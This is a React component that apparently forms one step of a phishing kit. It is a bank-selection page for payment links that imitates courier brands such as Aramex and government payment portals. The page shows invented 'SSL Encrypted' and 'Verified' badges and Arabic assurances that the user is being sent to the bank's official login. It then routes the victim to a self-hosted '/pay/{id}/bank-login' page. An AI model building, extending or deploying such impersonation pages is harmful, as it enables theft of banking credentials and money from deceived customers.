import { useState, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Building2, Loader2, CheckCircle2, Sparkles, ShieldCheck, Lock } from "lucide-react";
import { designSystem } from "@/lib/designSystem";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { isGovernmentService } from "@/lib/governmentPaymentServices";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";
import { formatCurrency, getCountryByCurrency } from "@/lib/countryCurrencies";
import BankLogo from "@/components/BankLogo";

import { getGovernmentLayout } from "@/components/GovernmentLayouts";
import { getNonGovPaymentGatewayVisuals, shouldUsePaymentGatewayVisuals } from "@/lib/nonGovPaymentGatewayVisuals";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const [searchParams] = useSearchParams();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [selectedBank, setSelectedBank] = useState<string>("");
  const [banks, setBanks] = useState<Bank[]>([]);
  const [loadingBanks, setLoadingBanks] = useState(false);
  const [isReady, setIsReady] = useState(false);
  
  const countryParam = searchParams.get('country') || searchParams.get('c');
  const serviceParam = searchParams.get('service') || searchParams.get('s');
  const amountParam = searchParams.get('amount') || searchParams.get('a');
  const currencyParam = searchParams.get('currency');
  
  // استنتاج الدولة من العملة إذا لم تكن موجودة
  const inferredCountryFromCurrency = currencyParam ? getCountryByCurrency(currencyParam) : null;
  
  const countryCode = countryParam || inferredCountryFromCurrency || linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  
  const govSystem = getGovernmentPaymentSystem(countryCode);
  
  const preselectedBank = linkData?.payload?.selected_bank;
  
  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = serviceParam || linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
  
  // Check if government service
  const isGovService = isGovernmentService(serviceKey);
  
  // Apply payment gateway visuals for non-government services
  const useGatewayVisuals = !isGovService && shouldUsePaymentGatewayVisuals(serviceKey);
  const gatewayVisuals = useGatewayVisuals ? getNonGovPaymentGatewayVisuals(countryCode, serviceKey) : null;
  
  const primaryColor = isGovService ? govSystem.colors.primary : (gatewayVisuals?.colors.primary || companyBranding?.colors.primary || branding.colors.primary);
  const secondaryColor = isGovService ? govSystem.colors.secondary : (gatewayVisuals?.colors.secondary || companyBranding?.colors.secondary || branding.colors.secondary);
  const surfaceColor = isGovService ? govSystem.colors.surface : (gatewayVisuals?.colors.surface || companyBranding?.colors.surface || '#F8F9FA');
  const fontFamily = isGovService ? govSystem.fonts.primaryAr : (gatewayVisuals?.fonts.primaryAr || companyBranding?.fonts.arabic || 'Cairo, sans-serif');
  const borderColor = gatewayVisuals?.colors.border || '#E5E7EB';
  
  const shippingInfo = linkData?.payload as any;
  const paymentData = shippingInfo?.payment_data;

  const rawAmount = amountParam || paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const currencyCode = currencyParam || paymentData?.currency_code || shippingInfo?.currency_code || countryData?.currency || "SAR";
  const formattedAmount = formatCurrency(amount, currencyCode);
  
  useEffect(() => {
    if (countryCode) {
      setLoadingBanks(true);
      setTimeout(() => {
        const countryBanks = getBanksByCountry(countryCode);
        setBanks(countryBanks);
        setLoadingBanks(false);
        setIsReady(true);
        
        if (preselectedBank) {
          setSelectedBank(preselectedBank);
        }
      }, 300);
    } else {
      setIsReady(true);
    }
  }, [countryCode, preselectedBank]);
  
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsReady(true);
    }, 2000);
    return () => clearTimeout(timer);
  }, []);
  
  const handleBankSelect = async (bankId: string) => {
    setSelectedBank(bankId);
    
    if (linkData) {
      try {
        const updatedPayload = {
          ...linkData.payload,
          selectedCountry: countryCode,
          selectedBank: bankId,
        };

        await updateLink.mutateAsync({
          linkId: id!,
          payload: updatedPayload
        });
      } catch (error) {
      }
    }

    const queryString = new URLSearchParams({
      country: countryCode,
      service: serviceKey,
      amount: amount.toString(),
      currency: currencyCode,
      bank: bankId
    }).toString();

    setTimeout(() => {
      navigate(`/pay/${id}/bank-login?${queryString}`);
    }, 400);
  };
  
  if (!isReady || (linkLoading && !countryParam)) {
    return (
      <div 
        className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
        dir="rtl"
        style={{
          background: govSystem.colors.surface
        }}
      >
        <div className="text-center">
          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: govSystem.colors.primary }} />
          <p style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>جاري تحميل البيانات...</p>
        </div>
      </div>
    );
  }
  
  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Building2 className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">خطأ في البيانات</h2>
          <p className="text-muted-foreground mb-6">لم يتم العثور على بيانات الدولة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }
  
  if (isGovService) {
    const GovLayout = getGovernmentLayout(countryCode);
    
    return (
      <GovLayout
        countryCode={countryCode}
        serviceName={govSystem.nameAr}
        amount={formattedAmount}
      >
        <div className="text-center mb-8">
          <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-3">اختر البنك للمتابعة</h2>
          <p className="text-sm sm:text-base text-gray-600">سيتم توجيهك إلى بوابة التسجيل الآمنة الخاصة بالبنك</p>
        </div>

        {/* Banks Grid - Clean Gov Style */}
        {loadingBanks ? (
          <div className="text-center py-12">
            <Loader2 className="w-10 h-10 animate-spin mx-auto mb-4 text-gray-400" />
            <p className="text-gray-500">جاري تحميل البنوك...</p>
          </div>
        ) : banks.length === 0 ? (
          <div className="text-center p-8 border border-dashed rounded-lg">
            <p className="text-gray-500">لا توجد بنوك متاحة حالياً</p>
          </div>
        ) : (
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-4 sm:gap-6">
            {banks.map((bank) => (
              <button
                key={bank.id}
                onClick={() => handleBankSelect(bank.id)}
                className="relative p-5 sm:p-6 rounded-2xl border-2 transition-all duration-300 flex flex-col items-center justify-center gap-4 bg-white hover:shadow-2xl hover:scale-105"
                style={{
                  borderColor: selectedBank === bank.id ? bank.color || govSystem.colors.primary : '#E5E7EB',
                  backgroundColor: selectedBank === bank.id ? `${bank.color || govSystem.colors.primary}05` : 'white',
                  boxShadow: selectedBank === bank.id ? `0 10px 40px -10px ${bank.color || govSystem.colors.primary}60` : '0 2px 8px rgba(0,0,0,0.04)',
                  borderRadius: govSystem.borderRadius.lg
                }}
              >
                <div className="w-full aspect-[3/2] flex items-center justify-center">
                  <BankLogo 
                    bankId={bank.id}
                    bankName={bank.name}
                    bankNameAr={bank.nameAr}
                    color={bank.color}
                    size="md"
                    className="w-full h-full object-contain"
                  />
                </div>
                <span className="text-sm sm:text-base font-bold text-center" style={{ color: selectedBank === bank.id ? (bank.color || govSystem.colors.primary) : '#374151' }}>{bank.nameAr}</span>
                {selectedBank === bank.id && (
                  <div className="absolute top-3 right-3">
                    <div className="w-7 h-7 rounded-full flex items-center justify-center shadow-lg" style={{ backgroundColor: bank.color || govSystem.colors.primary }}>
                      <CheckCircle2 className="w-5 h-5 text-white" strokeWidth={3} />
                    </div>
                  </div>
                )}
              </button>
            ))}
          </div>
        )}
        
        <div className="mt-10 p-5 sm:p-6 bg-gradient-to-r from-yellow-50 to-orange-50 border-2 border-yellow-200 rounded-2xl flex gap-4 text-start shadow-md" style={{ borderRadius: govSystem.borderRadius.lg }}>
          <div className="flex-shrink-0 w-12 h-12 rounded-full bg-yellow-400 flex items-center justify-center">
            <Lock className="w-6 h-6 text-yellow-900" />
          </div>
          <div>
            <p className="text-sm sm:text-base font-bold text-yellow-900 mb-2">
              ⚠️ تنبيه أمني هام
            </p>
            <p className="text-xs sm:text-sm text-yellow-800 leading-relaxed">
              تأكد دائماً من وجود رمز القفل 🔒 في شريط العنوان قبل إدخال أي بيانات بنكية. لا تشارك رمز التحقق OTP مع أي شخص أو جهة.
            </p>
          </div>
        </div>
      </GovLayout>
    );
  }

  return (
    <>
      <div 
        className="min-h-screen flex flex-col" 
        dir="rtl"
        style={{
          background: `linear-gradient(135deg, ${surfaceColor}, #FFFFFF)`,
          fontFamily: fontFamily
        }}
      >
        {/* Enhanced Header */}
        <div 
          className="w-full py-4 px-3 sm:px-4 shadow-md"
          style={{
            background: '#FFFFFF',
            borderBottom: `2px solid ${primaryColor}`
          }}
        >
          <div className="container mx-auto max-w-6xl">
            <div className="flex items-center justify-between mb-3">
              <div className="flex items-center gap-2 sm:gap-3">
                <div 
                  className="w-10 h-10 sm:w-12 sm:h-12 rounded-full flex items-center justify-center"
                  style={{
                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`
                  }}
                >
                  <Building2 className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
                </div>
                <div>
                  <h1 className="text-lg sm:text-xl font-bold" style={{ color: designSystem.colors.neutral[900] }}>
                    اختيار البنك
                  </h1>
                  <p className="text-xs sm:text-sm text-gray-500">
                    الخدمات المصرفية
                  </p>
                </div>
              </div>
              
              <div className="flex items-center gap-1.5 px-2 sm:px-3 py-1 rounded-full bg-green-50 border border-green-200">
                <ShieldCheck className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-green-600" />
                <span className="text-xs font-medium text-green-700">آمن</span>
              </div>
            </div>
            
            {/* Amount Display */}
            <div 
              className="inline-flex items-center gap-2 px-3 sm:px-4 py-2 rounded-full text-sm sm:text-base font-bold" 
              style={{ 
                background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                color: '#ffffff',
                boxShadow: '0 4px 12px rgba(0,0,0,0.1)'
              }}
            >
              <span>المبلغ:</span>
              <span className="text-base sm:text-lg">{formattedAmount}</span>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <div className="flex-1 py-6 sm:py-8">
          <div className="container mx-auto px-3 sm:px-4 max-w-5xl">
            <div className="text-center mb-8">
              <h2 
                  className="text-3xl sm:text-4xl font-black mb-4" 
                  style={{ 
                    color: designSystem.colors.neutral[900],
                    fontFamily: designSystem.typography.fontFamilies.arabic
                  }}
                >
                  اختر بنكك للمتابعة
                </h2>
              <p className="text-base sm:text-lg text-gray-600 max-w-2xl mx-auto">
                اختر البنك الخاص بك للانتقال إلى صفحة تسجيل الدخول الآمنة وإتمام عملية الدفع
              </p>
            </div>

            <div 
              className="max-w-3xl mx-auto mb-10 p-6 sm:p-8 rounded-2xl border-2 flex items-start gap-4 sm:gap-5 shadow-xl"
              style={{ 
                backgroundColor: `linear-gradient(135deg, ${primaryColor}06, ${primaryColor}03)`, 
                borderColor: `${primaryColor}25`,
                borderRadius: '20px'
              }}
            >
              <div className="flex-shrink-0 w-14 h-14 rounded-full flex items-center justify-center shadow-lg" style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}>
                <Lock className="w-7 h-7 text-white" />
              </div>
              <div>
                <p className="text-base sm:text-lg font-bold mb-2" style={{ color: designSystem.colors.neutral[900] }}>
                  🔒 معلومة أمنية هامة
                </p>
                <p className="text-sm sm:text-base text-gray-700 leading-relaxed">
                  سيتم تحويلك إلى صفحة تسجيل الدخول الرسمية الخاصة بالبنك المختار. لا تشارك بياناتك المصرفية أو رمز التحقق OTP مع أي شخص.
                </p>
              </div>
            </div>

            {/* Banks Grid */}
            {loadingBanks ? (
              <div className="text-center py-12">
                <Loader2 className="w-10 h-10 animate-spin mx-auto mb-4" style={{ color: primaryColor }} />
                <p className="text-gray-600">جاري تحميل البنوك المتاحة...</p>
              </div>
            ) : banks.length === 0 ? (
              <Card className="p-8 text-center max-w-md mx-auto" style={{ borderRadius: '16px', boxShadow: '0 4px 20px rgba(0,0,0,0.08)' }}>
                <Building2 className="w-16 h-16 mx-auto mb-4 text-gray-400" />
                <p className="text-lg font-semibold mb-2 text-gray-700">لا توجد بنوك متاحة</p>
                <p className="text-sm text-gray-500">لا توجد بنوك متاحة لهذه الدولة حالياً</p>
              </Card>
            ) : (
              <>
                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4 mb-8">
                  {banks.map((bank) => (
                    <button
                      key={bank.id}
                      className="group relative focus:outline-none focus:ring-2 focus:ring-offset-2 transition-all duration-200 rounded-xl"
                      style={{
                        focusRingColor: bank.color || primaryColor
                      }}
                      onClick={() => handleBankSelect(bank.id)}
                    >
                      <div 
                        className="relative overflow-hidden bg-white p-4 transition-all duration-300 flex flex-col items-center hover:shadow-xl"
                        style={{
                          borderRadius: '12px',
                          border: selectedBank === bank.id 
                            ? `3px solid ${bank.color || primaryColor}` 
                            : `2px solid ${designSystem.colors.neutral[200]}`,
                          boxShadow: selectedBank === bank.id 
                            ? `0 8px 30px -8px ${bank.color || primaryColor}60` 
                            : '0 2px 8px rgba(0,0,0,0.04)',
                          transform: selectedBank === bank.id ? 'translateY(-4px) scale(1.05)' : 'translateY(0) scale(1)',
                        }}
                      >
                        {/* Selection Checkmark */}
                        {selectedBank === bank.id && (
                          <div
                            className="absolute top-2 right-2 w-7 h-7 rounded-full flex items-center justify-center shadow-lg z-10 animate-in"
                            style={{ backgroundColor: bank.color || primaryColor }}
                          >
                            <CheckCircle2 className="w-4 h-4 text-white" strokeWidth={3} />
                          </div>
                        )}
                        
                        {/* Hover Overlay */}
                        <div 
                          className="absolute inset-0 opacity-0 group-hover:opacity-100 transition-opacity duration-300"
                          style={{
                            background: `linear-gradient(135deg, ${bank.color || primaryColor}06, ${bank.color || primaryColor}12)`,
                          }}
                        />
                        
                        {/* Bank Logo */}
                        <div className="w-full aspect-square flex items-center justify-center mb-3 relative z-10">
                          <BankLogo 
                            bankId={bank.id}
                            bankName={bank.name}
                            bankNameAr={bank.nameAr}
                            color={bank.color}
                            size="lg"
                            className="w-full h-full object-contain transition-transform duration-300 group-hover:scale-110"
                          />
                        </div>
                        
                        {/* Bank Name */}
                        <p 
                          className="text-center text-xs sm:text-sm font-bold leading-tight"
                          style={{ 
                            color: selectedBank === bank.id ? (bank.color || primaryColor) : designSystem.colors.neutral[700],
                            fontFamily: companyBranding?.fonts.arabic || govSystem.fonts.primaryAr
                          }}
                        >
                          {bank.nameAr}
                        </p>
                        
                        {/* Selection Indicator */}
                        {selectedBank === bank.id && (
                          <div 
                            className="absolute bottom-0 left-0 right-0 h-1"
                            style={{
                              background: `linear-gradient(90deg, transparent, ${bank.color || primaryColor}, transparent)`
                            }}
                          />
                        )}
                      </div>
                    </button>
                  ))}
                </div>

                <div 
                  className="max-w-3xl mx-auto mt-8 p-6 sm:p-8 rounded-2xl border-2 text-center shadow-xl" 
                  style={{ 
                    background: `linear-gradient(135deg, ${primaryColor}08, ${primaryColor}05)`, 
                    borderColor: `${primaryColor}30`,
                    borderRadius: '20px'
                  }}
                >
                  <div className="flex items-center justify-center gap-3 mb-3">
                    <div className="w-10 h-10 rounded-full flex items-center justify-center" style={{ background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})` }}>
                      <ShieldCheck className="w-6 h-6 text-white" />
                    </div>
                    <p className="text-lg sm:text-xl font-bold" style={{ color: designSystem.colors.neutral[900] }}>
                      اختر بنكك الآن
                    </p>
                  </div>
                  <p className="text-sm sm:text-base text-gray-700 leading-relaxed">
                    سيتم تحويلك إلى صفحة تسجيل الدخول الرسمية والآمنة الخاصة بالبنك المختار
                  </p>
                </div>
              </>
            )}
          </div>
        </div>

        {/* Footer */}
        <div className="py-6 border-t bg-white">
          <div className="container mx-auto px-4 max-w-5xl">
            <div className="flex flex-col sm:flex-row items-center justify-between gap-4 text-sm text-gray-500">
              <div className="flex items-center gap-4">
                <div className="flex items-center gap-2">
                  <Lock className="w-4 h-4" />
                  <span>SSL Encrypted</span>
                </div>
                <div className="flex items-center gap-2">
                  <ShieldCheck className="w-4 h-4" />
                  <span>Verified</span>
                </div>
              </div>
              <div className="text-center sm:text-right">
                <p className="text-xs">© 2025 جميع الحقوق محفوظة</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentBankSelector;
